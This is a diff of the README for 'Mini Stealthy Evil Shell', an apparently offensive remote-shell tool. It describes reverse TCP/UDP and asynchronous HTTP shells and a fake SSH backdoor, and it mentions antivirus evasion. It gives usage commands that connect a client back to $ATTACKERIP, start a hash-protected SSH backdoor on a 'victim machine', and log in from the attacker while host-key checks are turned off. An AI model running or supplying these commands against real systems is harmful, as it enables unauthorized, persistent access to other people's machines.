@@ -11,17 +11,17 @@ Mini Stealthy Evil Shell
     - [x] TCP (use SSH backdoor for encryption)
     - [x] UDP
         - [ ] DTLS
-    - [ ] Authentication
+    - [ ] use hash for auth
 - HTTP shell
     - Web Shell (will be available at [gohfs](https://github.com/finzzz/gohfs))
     - [x] Asynchronous
         - [ ] TLS
-        - [ ] Authentication
 - Others
     - [x] Auto reconnect
-    - [x] Fake SSH backdoor server
-        - [ ] Listen persistently
-        - [ ] Authentication
+    - [x] Fake SSH backdoor
+        - [ ] PTY shell
+        - [ ] Multiple connection
+    - [ ] Pack rustscan to the binary
 
 ## Choosing binary
 - There are only 2 types: `nd` (linux/amd64) `nd.exe` (windows/amd64)  
@@ -47,8 +47,7 @@ Mini Stealthy Evil Shell
 +--------------------+            +--------------------+
 ```
 
-## HTTP shell
-### Asynchronous
+## Asynchronous HTTP shell
 ```
 +-------------------------+                 +------------------------+
 |victim                   |                 |attacker                |
@@ -65,7 +64,17 @@ Mini Stealthy Evil Shell
 ```
 ```bash
 ./nd -async -m http -server # server
-./nd -host $ATTACKERIP -port $ATTACKERPORT -async -m http # client
+./nd -host $ATTACKERIP -port $ATTACKERPORT -m http # client
+```
+
+## Fake SSH Backdoor
+```bash
+# on victim machine
+echo -n "netdog" | sha256sum # generate password hash
+./nd -m ssh -hash d7b8c7f4fe8b3a9c2ed92189aed08530c5cb02c6e330a1fb3005cb4c0ca04151 # start the server
+
+# on attacker machine
+ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no whatever@victim -p 1234
 ```
 
 ## AV status
